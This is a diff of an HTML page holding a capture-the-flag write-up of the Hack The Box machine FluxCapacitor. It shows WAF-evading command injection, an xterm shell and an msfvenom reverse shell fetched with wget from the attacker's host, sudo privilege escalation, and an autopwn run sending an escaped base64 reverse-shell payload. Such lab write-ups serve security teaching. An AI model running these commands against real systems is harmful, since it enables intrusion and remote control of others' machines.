@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.38.2" />
+<meta name="generator" content="Hugo 0.78.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -155,7 +155,7 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "@type": "BlogPosting",
     "mainEntityOfPage":{
       "@type":"WebPage",
-      "@id":"https://alamot.github.io/"
+      "@id":"https:\/\/alamot.github.io\/"
     },
     "headline": "FluxCapacitor write-up |  ",
     "image": {
@@ -169,14 +169,14 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
-      "image": "https://alamot.github.io/images/logo.png"
+      "image": "https:\/\/alamot.github.io\/images/logo.png"
     },
     "publisher": {
       "@type": "Organization",
       "name": "",
       "logo": {
         "@type": "ImageObject",
-        "url": "https://alamot.github.io/images/logo.png",
+        "url": "https:\/\/alamot.github.io\/images/logo.png",
         "height": 60,
         "width": 60
       }
@@ -315,7 +315,7 @@ if (language) {
 
 <p>Let&rsquo;s scan the full range of TCP ports using my tool htbscan.py (you can find it here: <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py</a>).</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.69 500
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.69 500
 
 Running command: sudo masscan -e tun0 -p0-65535 --max-rate 500 --interactive 10.10.10.69
 
@@ -411,7 +411,7 @@ PORT   STATE SERVICE VERSION
 
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
 Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%)
-No exact OS matches for host (test conditions non-ideal).</code></pre></div></div>
+No exact OS matches for host (test conditions non-ideal).</code></pre></div>
 
 <h1 id="fuzzing-sync">Fuzzing /Sync</h1>
 
@@ -421,7 +421,7 @@ No exact OS matches for host (test conditions non-ideal).</code></pre></div></di
 ...</code></pre></div></p>
 
 <p>Let&rsquo;s check that url:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">curl http://10.10.10.69/sync --verbose
+<div class="bg-black"><pre><code class="language-console" data-lang="console">curl http://10.10.10.69/sync --verbose
 
 *   Trying 10.10.10.69...
 * TCP_NODELAY set
@@ -438,13 +438,13 @@ No exact OS matches for host (test conditions non-ideal).</code></pre></div></di
 &lt; Connection: keep-alive
 &lt; Server: SuperWAF
 &lt; 
-20171218T08:25:54</code></pre></div></div></p>
+20171218T08:25:54</code></pre></div></p>
 
 <p>Note that there is a filter that blocks some user agents. So if you have the word &ldquo;Mozilla&rdquo; or &ldquo;Opera&rdquo; in your user agent string you will get 403 forbidden. Here is the relevant rule from the /usr/local/ope\nresty/nginx/conf/nginx.conf file:
 <div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">    SecRule REQUEST_HEADERS:User-Agent &#34;^(Mozilla|Opera)&#34; &#34;id:1,phase:2,t:trim,block&#34;</code></pre></div></p>
 
 <p>Now let&rsquo;s fuzz /sync to see if we find anything interesting:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ wfuzz --hh BBB -H &#34;User-Agent:alamot&#34; -c -z file,/usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt http://10.10.10.69/sync/?FUZZ{not_this}=test
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ wfuzz --hh BBB -H &#34;User-Agent:alamot&#34; -c -z file,/usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt http://10.10.10.69/sync/?FUZZ{not_this}=test
 ********************************************************
 * Wfuzz 2.1.5 - The Web Bruteforcer                      *
 ********************************************************
@@ -457,28 +457,28 @@ ID	Response   Lines      Word         Chars          Request
 ==================================================================
 
 00000:  C=200      2 L	       1 W	     19 Ch	  &#34;not_this&#34;
-00705:  C=403      7 L	      10 W	    175 Ch	  &#34;opt&#34;</code></pre></div></div></p>
+00705:  C=403      7 L	      10 W	    175 Ch	  &#34;opt&#34;</code></pre></div></p>
 
-<p>We used /sync/?FUZZ{not_this}=test and we hoped to get a different answer for some parameter. The {not_this} is something we know that it doesn&rsquo;t exist and it help us to set the baseline. We are lucky because &ldquo;test&rdquo; is forbidden and we get a different answer when it is used in context with the parameter opt. Other value that would work is for example &ldquo;date&rdquo;. We will see that there is a filter that forbiddens all the words that there are inside  the /usr/local/openresty/nginx/conf/unixcmd.txt file.</p>
+<p>We used /sync/?FUZZ{not_this}=test and we hoped to get a different answer for some parameter. The {not_this} is something we know that it doesn&rsquo;t exist and it help us to set the baseline. We are lucky because &ldquo;test&rdquo; is forbidden and we get a different answer when it is used in context with the parameter opt. Other value that would work is for example &ldquo;date&rdquo;. We will see that there is a filter that forbids all the words that there are inside  the /usr/local/openresty/nginx/conf/unixcmd.txt file.</p>
 
 <h2 id="rce">RCE</h2>
 
 <p>We can get RCE like this:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; /usr/bin/whoami&#39;&#34;
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; /usr/bin/whoami&#39;&#34;
 nobody
-bash: -c: option requires an argument</code></pre></div></div></p>
+bash: -c: option requires an argument</code></pre></div></p>
 
 <p>We can bypass some filtering using backslash escape \ or brace expansion []:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; /usr/bin/whi[c]h mk\nod&#39;&#34;
-/bin/mknod</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; /usr/bin/whi[c]h mk\nod&#39;&#34;
+/bin/mknod</code></pre></div></p>
 
 <p>Now, let&rsquo;s examine a little more the point of injection using the command ps:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">curl &#34;http://10.10.10.69/sync?opt=&#39; p\s aux&#39;&#34;
-nobody   29849  0.0  0.0   4608   868 ?        S    17:19   0:00 sh -c CMD=&#39;/home/themiddle/checksync &#39; p\s aux&#39;&#39;; bash -c ${CMD} 2&gt;&amp;1</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">curl &#34;http://10.10.10.69/sync?opt=&#39; p\s aux&#39;&#34;
+nobody   29849  0.0  0.0   4608   868 ?        S    17:19   0:00 sh -c CMD=&#39;/home/themiddle/checksync &#39; p\s aux&#39;&#39;; bash -c ${CMD} 2&gt;&amp;1</code></pre></div></p>
 
 <p>We can get and examine some files like this:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">curl &#34;http://10.10.10.69/sync?opt=&#39; c\at /usr/local/ope\nresty/nginx/conf/nginx.conf&#39;&#34; &gt; nginx.conf
-curl &#34;http://10.10.10.69/sync?opt=&#39; c\at /usr/local/ope\nresty/nginx/conf/unixcmd.txt&#39;&#34; &gt; unixcmd.txt</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">curl &#34;http://10.10.10.69/sync?opt=&#39; c\at /usr/local/ope\nresty/nginx/conf/nginx.conf&#39;&#34; &gt; nginx.conf
+curl &#34;http://10.10.10.69/sync?opt=&#39; c\at /usr/local/ope\nresty/nginx/conf/unixcmd.txt&#39;&#34; &gt; unixcmd.txt</code></pre></div></p>
 
 <p>If we look inside nginx.conf we see the filtering rules and the command injection point:
 <div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">...
@@ -522,59 +522,59 @@ curl &#34;http://10.10.10.69/sync?opt=&#39; c\at /usr/local/ope\nresty/nginx/con
 <h2 id="getting-xterm-shell">Getting Xterm shell</h2>
 
 <p>Make sure your Xserver is listening to TCP:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ netstat -lntup
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ netstat -lntup
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID    
 tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      -                   
-tcp6       0      0 :::6000                 :::*                    LISTEN      -                   </code></pre></div></div></p>
+tcp6       0      0 :::6000                 :::*                    LISTEN      -                   </code></pre></div></p>
 
 <p>New Xserver versions have tcp listening disabled by default. Consult your distro how to enable it. You may have to change your display manager settings or the xserverrc file, e.g.:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cat /etc/X11/xinit/xserverrc
-<span class="cp">#!/bin/sh
-</span><span class="cp"></span><span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$XDG_VTNR</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
-  <span class="nb">exec</span> /usr/bin/X -listen tcp <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span>
-<span class="k">else</span>
-  <span class="nb">exec</span> /usr/bin/X -listen tcp <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span> vt<span class="nv">$XDG_VTNR</span>
-<span class="k">fi</span></code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cat /etc/X11/xinit/xserverrc
+#!/bin/sh
+if [ -z &#34;$XDG_VTNR&#34; ]; then
+  exec /usr/bin/X -listen tcp &#34;$@&#34;
+else
+  exec /usr/bin/X -listen tcp &#34;$@&#34; vt$XDG_VTNR
+fi</code></pre></div></p>
 
 <p>Then all you have to do is to allow incoming connections from the specific IP:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ xhost +10.10.10.69</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ xhost +10.10.10.69</code></pre></div></p>
 
 <p>Now let&rsquo;s connect:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; /usr/bin/xter\m -display 10.10.15.203:0&#39;&#34;</code></pre></div></div>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; /usr/bin/xter\m -display 10.10.15.203:0&#39;&#34;</code></pre></div>
 OR
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; DISPLAY=10.10.15.203:0 /usr/bin/xter\m&#39;&#34;</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; DISPLAY=10.10.15.203:0 /usr/bin/xter\m&#39;&#34;</code></pre></div></p>
 
 <h2 id="getting-a-shell-by-uploading-a-linux-elf">Getting a shell by uploading a linux elf</h2>
 
 <p>We can get a reverse shell this way too:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ msfvenom -p linux/x86/shell_reverse_tcp  LHOST=10.10.15.15 LPORT=80 -f elf &gt; /var/www/html/index.html
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ msfvenom -p linux/x86/shell_reverse_tcp  LHOST=10.10.15.15 LPORT=80 -f elf &gt; /var/www/html/index.html
 $ curl &#34;http://10.10.10.69/sync?opt=&#39; w\get 10.10.15.15 -P /tmp&#39;
 $ curl &#34;http://10.10.10.69/sync?opt=&#39; c\hmod +x /tmp/index.html&#39;
-$ curl &#34;http://10.10.10.69/sync?opt=&#39; /tmp/index.html&#39;</code></pre></div></div></p>
+$ curl &#34;http://10.10.10.69/sync?opt=&#39; /tmp/index.html&#39;</code></pre></div></p>
 
 <p>Don&rsquo;t forget to listen:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nc -lvp 80
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nc -lvp 80
 connect to [10.10.15.15 ] from (UNKNOWN) [10.10.15.15 ] 54678
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <h1 id="privilege-escalation">Privilege escalation</h1>
 
 <p>Let&rsquo;s examine if we have sudo:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; sudo -l&#39;&#34;
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; sudo -l&#39;&#34;
 
 Matching Defaults entries for nobody on fluxcapacitor:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User nobody may run the following commands on fluxcapacitor:
     (ALL) ALL
-    (root) NOPASSWD: /home/themiddle/.monit</code></pre></div></div></p>
+    (root) NOPASSWD: /home/themiddle/.monit</code></pre></div></p>
 
 <p>Nice! Let&rsquo;s check this .monit script:
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">root@fluxcapacitor:/home/themiddle# cat .monit
 
-<span class="cp">#!/bin/bash
-</span><span class="cp"></span>
+<span class="c1">#!/bin/bash</span>
+
 <span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;cmd&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
     <span class="nb">echo</span> <span class="s2">&#34;Trying to execute </span><span class="si">${</span><span class="nv">2</span><span class="si">}</span><span class="s2">&#34;</span>
     <span class="nv">CMD</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="si">${</span><span class="nv">2</span><span class="si">}</span> <span class="p">|</span> base64 -d<span class="k">)</span>
@@ -582,12 +582,12 @@ User nobody may run the following commands on fluxcapacitor:
 <span class="k">fi</span></code></pre></div></p>
 
 <p>All it needs is a base64-encoded command argument:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ $ echo -ne cat /root/root.txt | base64
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ $ echo -ne cat /root/root.txt | base64
 Y2F0IC9yb290L3Jvb3QudHh0
 
 $ curl -s &#34;http://fluxcapacitor.htb/sync?opt=&#39;\{ sudo /home/themiddle/.monit cmd Y2F0IC9yb290L3Jvb3QudHh0 \}&#39;&#34;
 Trying to execute Y2F0IC9yb290L3Jvb3QudHh0
-bdc89b40eda244649072189a8438b30e</code></pre></div></div></p>
+bdc89b40eda244649072189a8438b30e</code></pre></div></p>
 
 <h1 id="autopwn-script">Autopwn script</h1>
 
@@ -636,19 +636,19 @@ bdc89b40eda244649072189a8438b30e</code></pre></div></div></p>
 <span class="n">shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
 <span class="k">if</span> <span class="n">shell</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
     <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
 <span class="n">shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span></code></pre></div></p>
+<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span></code></pre></div></p>
 
 <p>Let&rsquo;s run it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ python2 autopwn_flux.py 
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ python2 autopwn_flux.py 
 [*] http://10.10.10.69:80/sync?opt=&#39; sudo /home/themiddle/.monit cmd L\3\V\z\c\i\9\i\a\W\4\v\c\H\l\0\a\G\9\u\M\y\A\t\Y\y\A\i\a\W\1\w\b\3\J\0\I\G\9\z\L\H\B\0\e\S\x\z\b\2\N\r\Z\X\Q\7\c\z\1\z\b\2\N\r\Z\X\Q\u\c\2\9\j\a\2\V\0\K\H\N\v\Y\2\t\l\d\C\5\B\R\l\9\J\T\k\V\U\L\H\N\v\Y\2\t\l\d\C\5\T\T\0\N\L\X\1\N\U\U\k\V\B\T\S\k\7\c\y\5\j\b\2\5\u\Z\W\N\0\K\C\g\n\M\T\A\u\M\T\A\u\M\T\Q\u\N\D\M\n\L\D\Y\w\M\D\A\x\K\S\k\7\b\3\M\u\Z\H\V\w\M\i\h\z\L\m\Z\p\b\G\V\u\b\y\g\p\L\D\A\p\O\2\9\z\L\m\R\1\c\D\I\o\c\y\5\m\a\W\x\l\b\m\8\o\K\S\w\x\K\T\t\v\c\y\5\k\d\X\A\y\K\H\M\u\Z\m\l\s\Z\W\5\v\K\C\k\s\M\i\k\7\b\3\M\u\c\H\V\0\Z\W\5\2\K\C\d\I\S\V\N\U\R\k\l\M\R\S\c\s\J\y\9\k\Z\X\Y\v\b\n\V\s\b\C\c\p\O\3\B\0\e\S\5\z\c\G\F\3\b\i\h\b\J\y\9\i\a\W\4\v\Y\m\F\z\a\C\c\s\J\y\1\p\J\1\0\p\O\3\M\u\Y\2\x\v\c\2\U\o\K\T\t\l\e\G\l\0\K\C\k\7\I\g\=\=&#39;
 [+] Trying to bind to 0.0.0.0 on port 60001: Done
 [*] I am sending the encoded payload for you...
 [+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.69 on port 49114
 [*] Switching to interactive mode
 root@fluxcapacitor:/# $ whoami
-root</code></pre></div></div></p>
+root</code></pre></div></p>
 
 <p>As you see, I escape every single character in the base64-encoded command argument. I do this to avoid being blocked by some filtering rule that will match some random combination of letters. You can download the script here: <a href="https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/FluxCapacitor/autopwn_flux.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/FluxCapacitor/autopwn_flux.py</a></p>
 
@@ -676,37 +676,17 @@ root</code></pre></div></div></p>
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
     </footer>
   </a>
 </article>
@@ -723,342 +703,6 @@ root</code></pre></div></div></p>
           
            
            
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Nineveh write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Dec 2017</time>
-      <time lang="el">17 Δεκ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Inception write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 Apr 2018</time>
-      <time lang="el">14 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Querier write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jun 2019</time>
-      <time lang="el">22 Ιουν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1120,17 +764,201 @@ root</code></pre></div></div></p>
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Unattended write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">23 Aug 2019</time>
-      <time lang="el">23 Αυγ 2019</time>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
     </footer>
   </a>
 </article>
@@ -1172,241 +1000,17 @@ root</code></pre></div></div></p>
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Enterprise write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
